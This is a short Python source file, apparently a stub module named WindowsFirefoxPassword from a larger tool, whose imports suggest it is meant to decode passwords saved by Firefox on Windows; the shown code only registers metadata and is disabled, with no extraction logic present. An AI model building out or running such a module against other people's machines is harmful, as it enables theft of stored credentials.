# coding: utf-8

try:
	import os
	import json
	from pyasn1.codec.der import decoder
	from base64 import b64decode
	import sqlite3
except ImportError:
	pass

from modules.windows.firefox.firefox_module import FirefoxModule


class WindowsFirefoxPassword(FirefoxModule):
	def __init__(self):
		FirefoxModule.__init__(
			self,
			name='WindowsFirefoxPassword',
			version='0.0.0',
			file=__file__,
			dependencies=[],
		)
		self.enable = False
